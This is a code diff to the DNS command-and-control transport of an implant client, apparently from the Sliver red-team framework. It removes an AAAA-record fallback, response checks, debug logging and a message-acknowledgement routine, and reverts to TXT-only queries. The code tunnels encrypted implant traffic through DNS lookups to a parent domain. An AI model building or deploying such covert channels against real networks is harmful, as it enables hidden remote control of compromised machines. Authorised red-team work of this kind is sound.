@@ -92,7 +92,6 @@ var (
 	ErrInvalidResponse     = errors.New("invalid response")
 	ErrInvalidIndex        = errors.New("invalid start/stop index")
 	ErrEmptyResponse       = errors.New("empty response")
-	ErrInvalidMsg          = errors.New("invalid dns message")
 )
 
 // DNSOptions - c2 specific options
@@ -103,7 +102,6 @@ type DNSOptions struct {
 	MaxErrors          int
 	WorkersPerResolver int
 	ForceBase32        bool
-	NoTXT              bool
 	ForceResolvConf    string
 	ForceResolvers     string
 }
@@ -143,7 +141,6 @@ func ParseDNSOptions(c2URI *url.URL) *DNSOptions {
 		MaxErrors:          maxErrors,
 		WorkersPerResolver: workersPerResolver,
 		ForceBase32:        strings.ToLower(c2URI.Query().Get("force-base32")) == "true",
-		NoTXT:              strings.ToLower(c2URI.Query().Get("notxt")) == "true",
 		ForceResolvConf:    c2URI.Query().Get("force-resolv-conf"),
 		ForceResolvers:     c2URI.Query().Get("resolvers"),
 	}
@@ -170,7 +167,6 @@ func NewDNSClient(parent string, opts *DNSOptions) *SliverDNSClient {
 		metadata:        map[string]*ResolverMetadata{},
 		parent:          parent,
 		forceBase32:     opts.ForceBase32,
-		noTXT:           opts.NoTXT,
 		forceResolvConf: opts.ForceResolvConf,
 		forceResolvers:  opts.ForceResolvers,
 		queryTimeout:    opts.QueryTimeout,
@@ -196,7 +192,6 @@ type SliverDNSClient struct {
 	retryCount      int
 	queryTimeout    time.Duration
 	forceBase32     bool
-	noTXT           bool
 	forceResolvConf string
 	forceResolvers  string
 	subdataSpace    int
@@ -261,8 +256,6 @@ func (w *DNSWorker) Start(id int, recvQueue <-chan *DNSWork, sendQueue <-chan *D
 			switch work.QueryType {
 			case dns.TypeA:
 				data, _, err = w.resolver.A(work.Domain)
-			case dns.TypeAAAA:
-				data, _, err = w.resolver.AAAA(work.Domain)
 			case dns.TypeTXT:
 				data, _, err = w.resolver.TXT(work.Domain)
 			}
@@ -299,7 +292,7 @@ func (s *SliverDNSClient) SessionInit() error {
 	s.resolvers = []DNSResolver{}
 	for _, server := range s.resolvConf.Servers {
 		s.resolvers = append(s.resolvers,
-			NewGenericResolver(server, s.resolvConf.Port, s.retryWait, s.retryCount, s.queryTimeout, s.parent),
+			NewGenericResolver(server, s.resolvConf.Port, s.retryWait, s.retryCount, s.queryTimeout),
 		)
 	}
 	// {{if .Config.Debug}}
@@ -347,14 +340,6 @@ func (s *SliverDNSClient) SessionInit() error {
 		// {{end}}
 		return err
 	}
-
-	if len(respData) < 1 {
-		// {{if .Config.Debug}}
-		log.Printf("[dns] no data received in message")
-		// {{end}}
-		return ErrEmptyResponse
-	}
-
 	data, err := s.cipherCtx.Decrypt(respData)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -404,14 +389,7 @@ func (s *SliverDNSClient) sendInit(resolver DNSResolver, encoder encoders.Encode
 	}
 	resp := []byte{}
 	for _, subdata := range allSubdata {
-
-		var respData []byte
-		var err error
-		if s.noTXT {
-			respData, _, err = resolver.AAAA(subdata)
-		} else {
-			respData, _, err = resolver.TXT(subdata)
-		}
+		respData, _, err := resolver.TXT(subdata)
 		if err != nil {
 			// {{if .Config.Debug}}
 			log.Printf("[dns] init msg failure %v", err)
@@ -420,11 +398,6 @@ func (s *SliverDNSClient) sendInit(resolver DNSResolver, encoder encoders.Encode
 		}
 		if 0 < len(respData) {
 			resp = append(resp, respData...)
-		} else {
-			// {{if .Config.Debug}}
-			log.Printf("[dns] no data received in response")
-			// {{end}}
-			return nil, ErrInvalidResponse
 		}
 	}
 	return resp, nil
@@ -452,7 +425,6 @@ func (s *SliverDNSClient) WriteEnvelope(envelope *pb.Envelope) error {
 
 // ReadEnvelope - Recv an envelope from the server
 func (s *SliverDNSClient) ReadEnvelope() (*pb.Envelope, error) {
-	var respData []byte
 	if s.closed {
 		return nil, ErrClosed
 	}
@@ -472,26 +444,14 @@ func (s *SliverDNSClient) ReadEnvelope() (*pb.Envelope, error) {
 	// {{if .Config.Debug}}
 	log.Printf("[dns] poll msg domain: %v", domain)
 	// {{end}}
-
-	if s.noTXT {
-		respData, _, err = resolver.AAAA(domain)
-		if err != nil {
-			return nil, err
-		}
-	} else {
-		respData, _, err = resolver.TXT(domain)
-		if err != nil {
-			return nil, err
-		}
+	respData, _, err := resolver.TXT(domain)
+	if err != nil {
+		return nil, err
 	}
-
 	// {{if .Config.Debug}}
 	log.Printf("[dns] read msg resp data: %v", respData)
 	// {{end}}
 	if len(respData) < 1 {
-		// {{if .Config.Debug}}
-		log.Printf("[dns] no data received in response")
-		// {{end}}
 		return nil, nil
 	}
 
@@ -511,38 +471,10 @@ func (s *SliverDNSClient) ReadEnvelope() (*pb.Envelope, error) {
 		return nil, err
 	}
 
-	if len(respData) < 1 {
-		// {{if .Config.Debug}}
-		log.Printf("[dns] no data received in message")
-		// {{end}}
-		return nil, nil
-	}
-
 	plaintext, err := s.cipherCtx.Decrypt(ciphertext)
-	if err != nil && err != cryptography.ErrReplayAttack {
-		return nil, err
-	}
-
-	//Send clear
-	clearMsg, err := s.clearMsg(dnsMsg.ID)
 	if err != nil {
 		return nil, err
 	}
-	domain, err = s.joinSubdataToParent(clearMsg)
-	if err != nil {
-		return nil, err
-	}
-	// {{if .Config.Debug}}
-	log.Printf("[dns] clear msg domain: %v", domain)
-	// {{end}}
-
-	respData, _, err = resolver.A(domain)
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("[dns] clear msg error: %s", err)
-		// {{end}}
-	}
-
 	envelope := &pb.Envelope{}
 	err = proto.Unmarshal(plaintext, envelope)
 	return envelope, err
@@ -597,12 +529,7 @@ func (s *SliverDNSClient) parallelRecv(manifest *dnspb.DNSMessage) ([]byte, erro
 		return nil, ErrInvalidResponse
 	}
 
-	var bytesPerTxt uint32
-	if s.noTXT {
-		bytesPerTxt = 192
-	} else {
-		bytesPerTxt = 182 // 189 with base64, -6 metadata, -1 margin
-	}
+	const bytesPerTxt = 182 // 189 with base64, -6 metadata, -1 margin
 
 	wg := &sync.WaitGroup{}
 	results := make(chan *DNSResult, int(manifest.Size/bytesPerTxt)+1)
@@ -628,21 +555,11 @@ func (s *SliverDNSClient) parallelRecv(manifest *dnspb.DNSMessage) ([]byte, erro
 		}
 
 		wg.Add(1)
-
-		if s.noTXT {
-			s.recvQueue <- &DNSWork{
-				QueryType: dns.TypeAAAA,
-				Domain:    domain,
-				Wg:        wg,
-				Results:   results,
-			}
-		} else {
-			s.recvQueue <- &DNSWork{
-				QueryType: dns.TypeTXT,
-				Domain:    domain,
-				Wg:        wg,
-				Results:   results,
-			}
+		s.recvQueue <- &DNSWork{
+			QueryType: dns.TypeTXT,
+			Domain:    domain,
+			Wg:        wg,
+			Results:   results,
 		}
 	}
 
@@ -653,9 +570,6 @@ func (s *SliverDNSClient) parallelRecv(manifest *dnspb.DNSMessage) ([]byte, erro
 	recvData := make(chan []byte)
 	errors := []error{}
 	go func() {
-		// {{if .Config.Debug}}
-		log.Printf("[dns] Manifest Len: %d ", manifest.Size)
-		// {{end}}
 		recvDataBuf := make([]byte, manifest.Size)
 		for result := range results {
 			if result.Err != nil {
@@ -663,14 +577,11 @@ func (s *SliverDNSClient) parallelRecv(manifest *dnspb.DNSMessage) ([]byte, erro
 				continue
 			}
 			// {{if .Config.Debug}}
-			log.Printf("[dns] read result data: Len: %d %v", len(result.Data), result.Data)
+			log.Printf("[dns] read result data: %v", result.Data)
 			// {{end}}
 			recvMsg := &dnspb.DNSMessage{}
 			err := proto.Unmarshal(result.Data, recvMsg)
 			if err != nil {
-				// {{if .Config.Debug}}
-				log.Printf("[dns] unmarshal error: %s", err)
-				// {{end}}
 				errors = append(errors, result.Err)
 				continue
 			}
@@ -678,9 +589,6 @@ func (s *SliverDNSClient) parallelRecv(manifest *dnspb.DNSMessage) ([]byte, erro
 			log.Printf("[dns] recv msg: %v", recvMsg)
 			// {{end}}
 			if manifest.Size < recvMsg.Start || int(manifest.Size) < int(recvMsg.Start)+len(recvMsg.Data) {
-				// {{if .Config.Debug}}
-				log.Printf("[dns] invalid index")
-				// {{end}}
 				errors = append(errors, ErrInvalidIndex)
 				continue
 			}
@@ -902,23 +810,6 @@ func (s *SliverDNSClient) pollMsg(meta *ResolverMetadata) (string, error) {
 		return string(msg), nil
 	} else {
 		msg, _ := s.base32.Encode(pollMsg)
-		return string(msg), nil
-	}
-}
-
-func (s *SliverDNSClient) clearMsg(msgId uint32) (string, error) {
-	nonceBuf := make([]byte, 8)
-	rand.Read(nonceBuf)
-	clearMsg, _ := proto.Marshal(&dnspb.DNSMessage{
-		ID:   msgId,
-		Type: dnspb.DNSMessageType_CLEAR,
-		Data: nonceBuf,
-	})
-	if s.enableCaseSensitiveEncoder {
-		msg, _ := s.base58.Encode(clearMsg)
-		return string(msg), nil
-	} else {
-		msg, _ := s.base32.Encode(clearMsg)
 		return string(msg), nil
 	}
 }
